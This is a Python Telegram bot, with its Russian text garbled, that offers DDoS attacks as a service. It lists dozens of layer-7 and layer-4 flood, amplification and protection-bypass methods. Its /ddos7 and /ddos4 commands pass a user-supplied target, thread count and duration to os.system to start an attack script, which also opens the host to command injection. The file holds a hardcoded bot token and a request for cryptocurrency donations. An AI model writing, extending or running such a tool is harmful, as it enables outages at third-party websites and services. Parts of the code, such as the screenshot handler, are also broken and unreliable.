import os
import telebot
from telebot import types

token = "5675173168:AAFQlo5i7w2zsXgrjJW6Z-qvMsywqT_m04Q"
bot = telebot.TeleBot(token, parse_mode=None)

methodsl7 = """–í—Å–µ –º–µ—Ç–æ–¥—ã DDOS-–ê—Ç–∞–∫ L7
üí£ Layer7

ü™¨ GET | GET Flood
ü™¨ POST | POST Flood
üé≠ OVH | Bypass OVH
üé≤ RHEX | Random HEX
üé≠ STOMP | Bypass chk_captcha
üíò STRESS | Send HTTP Packet With High Byte
üè† DYN | A New Method With Random SubDomain
üèá DOWNLOADER | A New Method of Reading data slowly
ü¶• SLOW | Slowloris Old Method of DDoS
üíÄ HEAD | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD
üé≠ NULL | Null UserAgent and ...
üç™ COOKIE | Random Cookie PHP 'if (isset($_COOKIE))'
üß© PPS | Only 'GET / HTTP/1.1\r\n\r\n'
ü™¨ EVEN | GET Method with more header
ü™© GSB | Google Project Shield Bypass
üå©Ô∏è DGB | DDoS Guard Bypass
üå©Ô∏è AVB | Arvan Cloud Bypass
ü§ñ BOT | Like Google bot
üß´ APACHE | Apache Expliot
üìã XMLRPC | WP XMLRPC expliot (add /xmlrpc.php)
‚òÅÔ∏è CFB | CloudFlare Bypass
‚òÅÔ∏è CFBUAM | CloudFlare Under Attack Mode Bypass
üé≠ BYPASS | Bypass Normal AntiDDoS
üí£ BOMB | Bypass with codesenberg/bombardier
üî™ KILLER | run many threads to kill a target
üßÖ TOR | Bypass onion website
"""
methodsl4 = """–í—Å–µ –º–µ—Ç–æ–¥—ã DDOS-–ê—Ç–∞–∫ L4
üß® Layer4:

ü™¨ TCP | TCP Flood Bypass
ü™¨ UDP | UDP Flood Bypass
ü™¨ SYN | SYN Flood
ü™¨ CPS | Open and close connections with proxy
üé≠ ICMP | Icmp echo request flood (Layer3)
üèá CONNECTION | Open connection alive with proxy
üèá VSE | Send Valve Source Engine Protocol
 TS3 | Send Teamspeak 3 Status Ping Protocol
ü™© FIVEM | Send Fivem Status Ping Protocol
‚òÅÔ∏è MEM | Memcached Amplification
ü™¨ NTP | NTP Amplification
ü§ñ MCBOT | Minecraft Bot Attack
ü§ñ MINECRAFT | Minecraft Status Ping Protocol
ü§ñ MCPE | Minecraft PE Status Ping Protocol
üè† DNS | DNS Amplification
üå©Ô∏è CHAR | Chargen Amplification
‚òÅÔ∏è CLDAP | Cldap Amplification
üíª ARD | Apple Remote Desktop Amplification
üñ•Ô∏è RDP | Remote Desktop Protocol Amplification
"""

@bot.message_handler(commands=['start'])
def start (message):
    bot.reply_to(message, "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!\n–ù–∞–ø–∏—à–∏—Ç–µ /help")
# —Ö—ç–ª–ø–∞
@bot.message_handler(commands=['help'])
def help (message):
    bot.reply_to(message, "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ DDoS Annor Bot:\n /ddos4 - DDOS-–ê—Ç–∞–∫–∞ –º–µ—Ç–æ–¥–∞–º–∏ L4.\n /ddos7 - DDOS-–ê—Ç–∞–∫–∞ –º–µ—Ç–æ–¥–∞–º–∏ L7.\n /methods - –ü–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ –º–µ—Ç–æ–¥—ã –∞—Ç–∞–∫. \n /help - –í—Å–µ –∫–æ–º–∞–Ω–¥—ã \n /author - author of bot")
#–º–µ—Ç–æ–¥—ã –∞—Ç–∞–∫
@bot.message_handler(commands=['methods'])
def methods(message):
    markup = telebot.types.InlineKeyboardMarkup()
    btn_l7 = telebot.types.InlineKeyboardButton(text='L7', callback_data='l7')
    btn_l4 = telebot.types.InlineKeyboardButton(text='L4', callback_data='l4')
    markup.row(btn_l7, btn_l4)
    bot.send_message(message.chat.id, '–í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥:', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'l7':
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=methodsl7, reply_markup=call.message.reply_markup)
    elif call.data == 'l4':
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=methodsl4, reply_markup=call.message.reply_markup)


# –¥–¥–æ—Å–Ω–∞—è —á–∞—Å—Ç—å
@bot.message_handler(commands=['ddos7'])
def handle_ddos7(message):
    global url, thread_bot, duration_bot
    try:
        # –†–∞–∑–±–∏–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ —Ç—Ä–∏ —á–∞—Å—Ç–∏
        command_parts = message.text.split()
        if len(command_parts) == 5:
            method = command_parts[1]
            url = command_parts[2]
            thread_bot = int(command_parts[3])
            duration_bot = int(command_parts[4])
            # –¥–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∞—Ç–∞–∫–∏
            markup = telebot.types.InlineKeyboardMarkup()
            btn_screen = telebot.types.InlineKeyboardButton(text='Screen', callback_data='scren')
            markup.add(btn_screen)
            btn_stop = telebot.types.InlineKeyboardButton(text='–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å DDoS', callback_data='stop_ddos')
            markup.add(btn_stop)
            bot.reply_to(message, "DDoS L7 Started!", reply_markup=markup)
            os.system(f"python3 start.py {method} {url} 0 {thread_bot} http.txt 10000 {duration_bot}")

        else:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ, –µ—Å–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ
            bot.reply_to(message, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: /ddos7 method url thread_bot duration_bot")
    except Exception as e:
        if str(e) == '–í–∞—à–∞_–æ—à–∏–±–∫–∞':
            bot.send_message(message.chat.id, '–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É')
        else:
            markup = telebot.types.InlineKeyboardMarkup()
            btn_support = telebot.types.InlineKeyboardButton(text='–°–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π', url='https://t.me/kazakhstanadm')
            markup.add(btn_support)
            bot.send_message(message.chat.id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π', reply_markup=markup)

#l4
@bot.message_handler(commands=['ddos4'])
def handle_ddos4(message):
    global url, thread_bot, duration_bot

    try:
        # –†–∞–∑–±–∏–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ —Ç—Ä–∏ —á–∞—Å—Ç–∏
        command_parts = message.text.split()
        if len(command_parts) == 5:
            method = command_parts[1]
            url = command_parts[2]
            thread_bot = int(command_parts[3])
            duration_bot = int(command_parts[4])
            # –¥–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∞—Ç–∞–∫–∏
            markup = telebot.types.InlineKeyboardMarkup()
            btn_screen = telebot.types.InlineKeyboardButton(text='Screen', callback_data='scren')
            markup.add(btn_screen)
            btn_stop = telebot.types.InlineKeyboardButton(text='–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å DDoS', callback_data='stop_ddos')
            markup.add(btn_stop)
            bot.reply_to(message, "DDoS L4 Started!", reply_markup=markup)
            os.system(f"python3 start.py {method} {url} {thread_bot} {duration_bot}")
        else:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ, –µ—Å–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ
            bot.reply_to(message, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ: /ddos4 method url thread_bot duration_bot")
    except Exception as e:
        if str(e) == '–í–∞—à–∞_–æ—à–∏–±–∫–∞':
            bot.send_message(message.chat.id, '–ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É')
        else:
            markup = telebot.types.InlineKeyboardMarkup()
            btn_support = telebot.types.InlineKeyboardButton(text='–°–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π', url='https://t.me/kazakhstanadm')
            markup.add(btn_support)
            bot.send_message(message.chat.id, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π', reply_markup=markup)

#–¥–¥–æ—Å –æ—Ç–∫–ª—é—á–∏—Ç–µ–ª—å
@bot.callback_query_handler(func=lambda call: call.data == 'stop_ddos')
def stop_ddos(callback_query):
    # –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º DDoS –∞—Ç–∞–∫—É
    os.system('pkill python3')
    bot.answer_callback_query(callback_query.id, text='DDoS –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!')

@bot.message_handler(commands=['screen'])
async def handle_screen(message):
    url = message.text.split()[1]  # –ø–æ–ª—É—á–∞–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ —Å–∞–π—Ç –∏–∑ –∫–æ–º–∞–Ω–¥—ã
    options = webdriver.ChromeOptions()
    options.add_argument('headless')  # —Å–∫—Ä—ã–≤–∞–µ–º –±—Ä–∞—É–∑–µ—Ä
    driver = webdriver.Chrome(options=options)  # —Å–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –±—Ä–∞—É–∑–µ—Ä–∞
    driver.get(url)  # –æ—Ç–∫—Ä—ã–≤–∞–µ–º —Å–∞–π—Ç
    driver.save_screenshot('screenshot.png')  # –¥–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ –≤ —Ñ–∞–π–ª
    driver.quit()  # –∑–∞–∫—Ä—ã–≤–∞–µ–º –±—Ä–∞—É–∑–µ—Ä
    with open('screenshot.png', 'rb') as f:
        bot.send_photo(message.chat.id, f)  # –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é

@bot.callback_query_handler(func=lambda call: call.data == 'scren')
def handle_screen_callback(call):
    # –°–æ–∑–¥–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ –≤ —Ñ–∞–π–ª
    options = webdriver.ChromeOptions()
    options.add_argument('headless')  # —Å–∫—Ä—ã–≤–∞–µ–º –±—Ä–∞—É–∑–µ—Ä
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    driver.save_screenshot('screenshot.png')
    driver.quit()

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
    with open('screenshot.png', 'rb') as f:
        media = telebot.types.InputMediaPhoto(f)
        bot.edit_message_media(media=media, chat_id=call.message.chat.id, message_id=call.message.message_id)


# –ö–æ–º–∞–Ω–¥–∞ /author
@bot.message_handler(commands=['author'])
def author (message):
    bot.reply_to(message, "TG: @kazakhstanadm\nDiscord: HFMFH#2764\n\n–ü–æ–¥–¥–µ—Ä–∂–∏—Ç–µ –Ω–∞—Å –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–∞–º –∏ –ø–æ–ø—Ä–æ—Å–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫ btc/eth/–∫–∞—Ä—Ç–∞ –∏ —Ç.–¥ –¥–ª—è –¥–æ–Ω–∞—Ç–∞!")
        

bot.polling(none_stop=True)
